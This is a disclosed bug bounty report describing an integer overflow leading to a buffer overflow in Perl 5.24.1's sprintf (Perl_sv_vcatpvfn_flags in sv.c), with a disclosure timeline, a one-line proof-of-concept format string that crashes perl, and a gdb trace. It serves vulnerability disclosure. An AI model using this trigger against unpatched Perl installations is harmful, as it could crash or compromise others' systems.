# [M] Format string implementation vulnerability, resulting in code execution

## Summary
Severity: Medium
Program: Internet Bug Bounty
Weakness: Memory Corruption - Generic
Reporter: aerodudrizzt
State: resolved
Disclosed: 2019-10-13T10:32:46.177Z
Source: https://hackerone.com/reports/271330

## Details
In a security audit to the sprintf implementation in perl (version 5.24.1) I found a major security vulnerability, here are the full details.
Timeline:
======
* 6th of May, 2017 - disclosure to the PERL security mailing list
* 8th of May, 2017 - vulnerability confirmed by PERL's security group, found relevant to *all* maintained branches
* 9th of May, 2017 - patch issued to branches "blead"
* 30th of May, 2017 - a patched 5.26 branch is released
* 24th of August, 2017 - a patch was committed to the 5.24 branch, awaiting 5.24.3 release
* 22nd of September, 2017 - 5.24.3 was released, announcing the format string vulnerability in the release notes - public disclosure by the project

Technical Details:
===========
file: sv.c
function: Perl_sv_vcatpvfn_flags

* precis - represents a format's precision, and can be any size_t value
* width - represents the format's width, and can be any non-negative size_t value
* Using large values can cause *multiple Integer-Overflows* when calculating 'need' = the needed allocated space for a fraction
 * line 12300:        need += has_precis ? precis : 6; /* known default */
 * later on more values are added to need (need += 20, ...)
* Later on the use of 'width' for padding with spaces *assumes* that there is enough space in the buffer, causing a *Buffer Overflow*

PoC Script:
------------
```
print sprintf("%2000.2000f this is a spacer %4000.4294967245a", 1, 0x0.00008234p+9);
```
Crash trace - tested on a 32 bit linux machine:
--------------------------------------------------
```
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x080ebbe0 in Perl_runops_standard ()
(gdb) bt
#0  0x080ebbe0 in Perl_runops_standard ()
#1  0x08069356 in S_fold_constants ()
#2  0x080a8336 in Perl_yyparse ()
#3  0x08083219 in perl_parse ()
#4  0x0806218c in main ()
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/271330_
